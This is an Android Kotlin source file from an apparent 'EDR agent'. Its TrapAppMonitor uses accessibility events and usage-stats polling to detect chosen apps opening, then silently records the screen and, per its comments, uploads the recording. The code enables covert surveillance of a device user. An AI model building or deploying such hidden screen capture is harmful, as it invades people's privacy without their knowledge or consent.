package com.edr.agent.monitor

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.edr.agent.screen.AppTrapScreenRecorder
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap

/**
 * TrapAppMonitor: Monitors for trapped (watched) apps opening on the device.
 *
 * When a configured app opens, it silently starts screen recording via AppTrapScreenRecorder.
 * When the app closes or the user navigates away, it stops and uploads the recording.
 *
 * Two detection paths:
 *  1. INSTANT: AccessibilityService TYPE_WINDOW_STATE_CHANGED -> onWindowChanged()
 *  2. FALLBACK: Slow UsageStats polling every 5s -> checkForegroundApp() (battery-safe backup)
 *
 * NO camera photos are taken. NO interaction with user apps. NO gestures or clicks.
 */
object TrapAppMonitor {
    private const val TAG = "TrapAppMonitor"

    // Cooldown prevents re-triggering within 30 seconds of the previous recording for the same app
    private const val COOLDOWN_MS = 30_000L
    private const val STOP_CONFIRM_DELAY_MS = 1500L

    private val TRANSIENT_SYSTEM_PACKAGES = setOf(
        "com.android.systemui",
        "android",
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        "com.vivo.permissionmanager",
        "com.lbe.security.miui",
        "com.miui.securitycenter",
        "com.google.android.inputmethod.latin",
        "com.emoji.keyboard.touchpal",
        "com.baidu.input_vivo"
    )

    private val trapPackages = Collections.synchronizedSet(mutableSetOf<String>())
    private val cooldownMap = ConcurrentHashMap<String, Long>()
    private val appLabelCache = ConcurrentHashMap<String, String>()
    private var isInitialized = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingStopRunnable: Runnable? = null
    @Volatile
    private var lastPolledEventTime = 0L

    // Own package name cached to avoid calling context.packageName on every event
    private var ownPackageName = ""

    private fun isTransientSystemPackage(pkg: String): Boolean {
        if (pkg in TRANSIENT_SYSTEM_PACKAGES) return true
        return pkg.contains("inputmethod", ignoreCase = true) ||
            pkg.contains("keyboard", ignoreCase = true)
    }

    private fun scheduleDeferredStop(context: Context, expectedRecordingPkg: String, reason: String) {
        if (pendingStopRunnable != null) return
        val appContext = context.applicationContext
        val runnable = Runnable {
            pendingStopRunnable = null
            if (AppTrapScreenRecorder.isCurrentlyRecording()
                && AppTrapScreenRecorder.getRecordingPackage() == expectedRecordingPkg
            ) {
                Log.i(TAG, "$reason. Stopping recording for '$expectedRecordingPkg'.")
                AppTrapScreenRecorder.stopRecording(appContext)
            }
        }
        pendingStopRunnable = runnable
        mainHandler.postDelayed(runnable, STOP_CONFIRM_DELAY_MS)
    }

    private fun cancelDeferredStop() {
        pendingStopRunnable?.let {
            mainHandler.removeCallbacks(it)
            pendingStopRunnable = null
        }
    }

    @Synchronized
    fun initialize(context: Context) {
        if (!isInitialized) {
            ownPackageName = context.packageName
            val saved = SyncPreferences.getTrapAppPackages()
            trapPackages.clear()
            trapPackages.addAll(saved)
            isInitialized = true
            Log.i(TAG, "Initialized with ${trapPackages.size} trap package(s): $trapPackages")
        }
    }

    @Synchronized
    fun updateTrapPackages(packages: Set<String>) {
        trapPackages.clear()
        trapPackages.addAll(packages)
        SyncPreferences.setTrapAppPackages(packages)
        Log.i(TAG, "Trap packages updated: ${packages.size} app(s): $packages")
        com.edr.agent.service.EdrForegroundService.instance?.updateTrapFallbackSchedule()
    }

    fun getTrapPackages(): Set<String> = trapPackages.toSet()

    fun hasActiveTrapsOrRecording(): Boolean {
        return trapPackages.isNotEmpty() || AppTrapScreenRecorder.isCurrentlyRecording()
    }

    /**
     * Called instantly by EdrAccessibilityService when the foreground window changes.
     * This is the PRIMARY detection path. Runs on the accessibility thread — keep it fast.
     *
     * @param context Application context
     * @param pkg     Package name of the newly-foreground app/window
     */
    fun onWindowChanged(context: Context, pkg: String) {
        // Ignore our own EDR agent app or transient overlays (SystemUI, keyboards, permission dialogs)
        if (pkg.isEmpty() || pkg == ownPackageName || isTransientSystemPackage(pkg)) return

        if (trapPackages.contains(pkg)) {
            cancelDeferredStop()
            if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                return
            }

            val now = System.currentTimeMillis()
            val lastTrigger = cooldownMap[pkg] ?: 0L
            if (now - lastTrigger < COOLDOWN_MS) return  // Still in cooldown

            cooldownMap[pkg] = now

            val appLabel = resolveAppLabel(context, pkg)
            Log.w(TAG, "TRAP: '$appLabel' ($pkg) opened. Starting silent screen recording.")
            EdrLocalStorage.appendEdrLog(
                context, "TRAP_ALERT",
                "Trap app opened: $appLabel. Screen recording started."
            )
            AppTrapScreenRecorder.startRecording(context, pkg, appLabel)

        } else if (AppTrapScreenRecorder.isCurrentlyRecording()) {
            // Confirm user truly navigated away from the trapped app before stopping
            val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
            if (recordingPkg != null && recordingPkg != pkg) {
                scheduleDeferredStop(context, recordingPkg, "Window switched to '$pkg'")
            }
        }
    }

    /**
     * Fallback poller using UsageStatsManager. Called every 5 seconds by EdrForegroundService.
     * Only active as a safety net in case AccessibilityService events are delayed.
     */
    fun checkForegroundApp(context: Context) {
        if (trapPackages.isEmpty() && !AppTrapScreenRecorder.isCurrentlyRecording()) return

        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
        val now = System.currentTimeMillis()
        val queryStart = if (lastPolledEventTime > now - 10_000L) lastPolledEventTime else now - 6000L

        try {
            val events = usm.queryEvents(queryStart, now) ?: return
            val event = UsageEvents.Event()
            var latestForegroundPkg: String? = null
            var latestTime = lastPolledEventTime

            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                if (event.timeStamp <= lastPolledEventTime) continue
                latestTime = maxOf(latestTime, event.timeStamp)

                val pkg = event.packageName ?: continue
                if (pkg == ownPackageName || isTransientSystemPackage(pkg)) continue

                if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                    latestForegroundPkg = pkg
                }
            }

            lastPolledEventTime = latestTime
            val pkg = latestForegroundPkg ?: return

            if (trapPackages.contains(pkg)) {
                cancelDeferredStop()
                if (AppTrapScreenRecorder.isCurrentlyRecording() && AppTrapScreenRecorder.getRecordingPackage() == pkg) {
                    return
                }
                val lastTrigger = cooldownMap[pkg] ?: 0L
                if (now - lastTrigger >= COOLDOWN_MS) {
                    cooldownMap[pkg] = now
                    val appLabel = resolveAppLabel(context, pkg)
                    Log.w(TAG, "TRAP (fallback poller): '$appLabel' ($pkg) opened.")
                    EdrLocalStorage.appendEdrLog(
                        context, "TRAP_ALERT",
                        "Trap app opened (fallback): $appLabel. Screen recording started."
                    )
                    AppTrapScreenRecorder.startRecording(context, pkg, appLabel)
                }
            } else if (AppTrapScreenRecorder.isCurrentlyRecording()) {
                val recordingPkg = AppTrapScreenRecorder.getRecordingPackage()
                if (recordingPkg != null && recordingPkg != pkg) {
                    scheduleDeferredStop(context, recordingPkg, "Fallback: switched to '$pkg'")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error in checkForegroundApp: ${e.message}")
        }
    }

    private fun resolveAppLabel(context: Context, pkg: String): String {
        appLabelCache[pkg]?.let { return it }
        val resolved = try {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            pkg
        }
        appLabelCache[pkg] = resolved
        return resolved
    }
}
